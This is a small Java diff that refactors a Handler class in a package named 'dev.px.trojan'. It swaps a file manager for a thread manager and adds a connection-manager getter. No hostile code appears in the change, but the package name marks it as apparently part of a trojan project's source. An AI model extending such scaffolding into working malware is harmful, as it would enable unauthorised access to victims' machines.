@@ -1,17 +1,21 @@
 package dev.px.trojan.Impl;
 
-import dev.px.trojan.Connections.ConnectionSocket;
-import dev.px.trojan.Util.Directorys;
-import dev.px.trojan.Util.OSCheckerJ;
+import dev.px.trojan.Manager.ConnectionManager;
+import dev.px.trojan.Manager.ThreadManager;
 
 public class Handler {
 
     private ConnectionManager connectionManager;
-    private FileManager fileManager;
+
+    private ThreadManager threadManager;
 
     public Handler() {
         this.connectionManager = new ConnectionManager();
-        this.fileManager = new FileManager();
+        this.threadManager = new ThreadManager().build();
+    }
+
+    public ConnectionManager getConnectionManager() {
+        return connectionManager;
     }
 
 }
